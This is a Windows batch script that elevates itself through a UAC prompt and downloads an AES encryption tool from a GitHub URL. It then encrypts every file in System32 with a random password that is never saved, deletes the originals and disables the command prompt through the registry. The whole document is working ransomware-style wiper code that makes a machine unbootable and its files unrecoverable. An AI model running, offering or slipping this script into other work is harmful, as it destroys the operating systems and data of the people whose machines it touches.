@echo off
 :: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /B

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------  


powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/koef010/aescrypt-console/raw/refs/heads/main/aescrypt.exe','%systemdrive%\aescrypt.exe')"
set pass=%random% 
cd "%systemroot%\system32"
For /f "tokens=*" %%A in ('dir /b /s /a-d-h') do (
    C:\aescrypt -e -p %pass% "%%~A"
    ren "%%~A.aes" "%%~nA%%~xA.crypted"
    del /f /q "%%~A"
)
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
